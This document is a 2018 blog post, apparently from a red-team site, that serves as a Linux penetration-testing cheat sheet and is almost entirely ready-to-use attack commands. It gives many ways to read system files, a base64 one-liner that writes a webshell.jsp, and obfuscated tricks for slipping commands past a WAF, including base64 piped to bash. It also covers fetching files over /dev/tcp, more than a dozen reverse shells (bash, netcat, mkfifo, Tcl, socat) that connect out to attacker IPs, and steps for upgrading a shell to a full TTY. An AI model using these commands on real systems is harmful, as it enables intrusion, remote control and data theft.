---
layout: post
title: Some Linux Hacking Tricks
date: 2018-05-10 13:43:02
categories: [Pentest, Red Team]
---

**There is always a method here is useful for you to penetration test  ：）**

#### Some ways to read system files
```bash
cat /etc/issue
tac /etc/issue
less /etc/issue
more /etc/issue
head /etc/issue
tail /etc/issue
nl /etc/issue
xxd /etc/issue
sort /etc/issue
uniq /etc/issue
strings /etc/issue
sed -n '1,10p' /etc/issue
grep . /etc/issue
python -c "print(open('/etc/issue').read())"
perl -F: -lane 'print "@F[0..4]\n"' /etc/issue
ruby -e 'IO.foreach("/etc/issue"){|a| print a}'
php -r "echo file_get_contents('/etc/issue');"
echo $(</etc/issue) or echo `</etc/issue`
awk '{print $0}' /etc/issue
base64 -i /etc/issue
dd count=1000 bs=1 if=/etc/issue 2>/dev/null
egrep|fgrep|rgrep|agrep "" /etc/issue
rev /etc/issue
comm /etc/issue /etc/issue
paste /etc/issue
```

#### Echo a large file to the file System
<!--more-->
```bash
echo -n "aGVsbG8gd29ybGQK"|base64 -d > webshell.jsp
```
#### Execute commands in bash to bypass waf

```bash
# cat /etc/issue
$1c$2a$3t$IFS/$4e$5t$6c/$7i$8s$9s$1u$1e 
IFS=,;`cat<<<cat,/etc/issue`
{cat,/etc/issue}
cat<>/etc/issue
CMD=$'\x20/etc/issue'&&cat$CMD
echo Y2F0IC9ldGMvaXNzdWU=|base64 -d|bash
```
#### Download file without nc&wget
```bash
exec 5<>/dev/tcp/ip/port &&echo -e "GET /filename HTTP/1.0\n" >&5 && cat<&5 > filename
```
#### Create An Interactive Shell
```bash
# Use Bash
$ bash -i >& /dev/tcp/192.168.68.206/2333 0>&1
$ exec 196<>/dev/tcp/192.168.68.206/2333; sh <&196 >&196 2>&196
$ exec 5<>/dev/tcp/192.168.68.206/2333 cat <&5 | while read line; do $line 2>&5 >&5;done
$ exec 5<>/dev/tcp/192.168.68.206/2333 cat <&5 | while read line 0<&5; do $line 2>&5 >&5; done

# Use Netcat
$ nc -e /bin/sh 192.168.68.206 2333  
$ mkfifo fifo ; nc.traditional -u 192.168.199.199 5555 < fifo | { bash -i; } > fifo
$ nc 192.168.199.199 5555 -c /bin/bash
$ if [ -e /tmp/f ]; then rm /tmp/f;fi;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.199.199 5555 > /tmp/f
$ if [ -e /tmp/f ]; then rm -f /tmp/f;fi;mknod /tmp/f p && nc 192.168.199.199 5555 0</tmp/f|/bin/bash 1>/tmp/f
$ nc 192.168.68.206 2333|/bin/sh|nc 192.168.68.206 2444  

# Use TCHsh
$ echo 'set s [socket 192.168.199.199 5555];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh # tcp

# Use Socat
$ socat tcp-connect:192.168.199.199:5555 exec:"bash -li",pty,stderr,setsid,sigint,sane # tcp

## Full list please read my blog
## http://reverse-tcp.xyz/2017/01/08/Some-Ways-To-Create-An-Interactive-Shell-On-Linux/
```
#### Use rlwrap to run netcat and create a listening port
```bash
# Allow the editing of keyboard input for any other command.
rlwrap -S "$(printf '\033[95mFS>\033[m ')" nc -lvvp 4444
```

#### Upgrading simple shells to fully interactive TTYs
```bash
## use Python to spawn a pty
python -c 'import pty; pty.spawn("/bin/bash")'

## Using socat
# Socat is like netcat and it can be used to pass full TTY's over TCP connections.
# If socat isn't installed, you can download id from here : https://github.com/andrew-d/static-binaries
# On Attack Host
socat file:`tty`,raw,echo=0 tcp-listen:4444 
# On Victim
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

## Using Expect
cat sh.exp
#!/usr/bin/expect
# Spawn a shell, then allow the user to interact with it.
# The new shell will have a good enough TTY to run tools like ssh, su and login
spawn sh
interact
# In reverse shell
expect sh.exp

## Using stty options
#
# In reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
# In attack shell
stty raw -echo
fg
# In reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

#### One command to locate the web path
```bash
find / -type f -name "*.*" | xargs grep "htmlstring"
```

